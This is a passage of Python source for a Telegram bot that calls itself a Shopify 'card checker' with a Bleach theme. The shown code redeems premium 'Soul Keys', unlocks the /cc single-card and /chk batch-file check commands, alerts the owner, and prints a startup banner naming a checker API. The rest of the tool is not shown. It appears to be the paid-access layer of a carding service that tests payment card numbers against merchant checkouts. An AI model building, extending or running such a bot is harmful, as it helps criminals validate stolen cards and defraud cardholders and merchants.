        f"{key_lines}\n\n"
        f"<b>Users redeem with:</b> <code>/redeem KEY</code>",
        parse_mode='html'
    )

# ============================================================================
# 🔓 /redeem - REDEEM PREMIUM KEY
# ============================================================================

@bot.on(events.NewMessage(pattern=r'^/redeem\s+'))
async def redeem_handler(event):
    user_id = event.sender_id
    key     = event.message.text.replace('/redeem', '').strip().upper()

    if is_premium(user_id):
        await event.reply("<b>✅ You already have Bankai access!</b>", parse_mode='html')
        return

    keys_data = load_keys()
    if key not in keys_data:
        await event.reply(
            "<b>❌ Invalid Key</b>\n\nThis Soul Key does not exist.",
            parse_mode='html'
        )
        return

    if keys_data[key]['used']:
        await event.reply(
            "<b>❌ Key Already Used</b>\n\nThis Soul Key has already been redeemed.",
            parse_mode='html'
        )
        return

    days = keys_data[key].get('days', 0)
    keys_data[key]['used']    = True
    keys_data[key]['used_by'] = user_id
    keys_data[key]['used_at'] = datetime.now().isoformat()
    save_keys(keys_data)
    add_premium(user_id, days)

    duration = f"{days} days" if days > 0 else "♾️ Permanent"
    expiry   = get_premium_expiry(user_id)

    await event.reply(
        f"<b>🔥 『 BANKAI UNLOCKED 』🔥</b>\n\n"
        f"<b>✅ Key accepted!</b>\n"
        f"<b>💜 Soul ID:</b>  <code>{user_id}</code>\n"
        f"<b>⏳ Duration:</b> {duration}\n"
        f"<b>📅 Expires:</b>  {expiry}\n\n"
        f"You now have full Zanpakuto Arsenal access:\n"
        f"• /cc — Single card check\n"
        f"• /chk — Batch file check\n\n"
        f"<b>⚫ Welcome to Soul Society, Reaper!</b>",
        parse_mode='html'
    )

    try:
        await bot.send_message(
            OWNER_ID,
            f"<b>🔑 Key Redeemed</b>\n\n"
            f"<b>Key:</b>     <code>{key}</code>\n"
            f"<b>User:</b>    <code>{user_id}</code>\n"
            f"<b>Duration:</b> {duration}\n"
            f"<b>Expires:</b>  {expiry}",
            parse_mode='html'
        )
    except Exception:
        pass

# ============================================================================
# 🚀 STARTUP
# ============================================================================

print("\n🔥 ╔══════════════════════════════════╗ 🔥")
print("🔥 ║   𝗕𝗔𝗡𝗞𝗔𝗜 𝗦𝗛𝗢𝗣 - ACTIVATED        ║ 🔥")
print("🔥 ║   Soul Reaper Card Checker        ║ 🔥")
print("🔥 ║   Bleach × Shopify Fusion         ║ 🔥")
print("🔥 ╚══════════════════════════════════╝ 🔥\n")
print("⚔️  Zanpakuto Engine : Connected")
print(f"🌐 Checker API     : {CHECKER_API}")
print("💜 Reiatsu System  : Online")
print("⛩️  Soul Society    : Ready\n")

bot.run_until_disconnected()
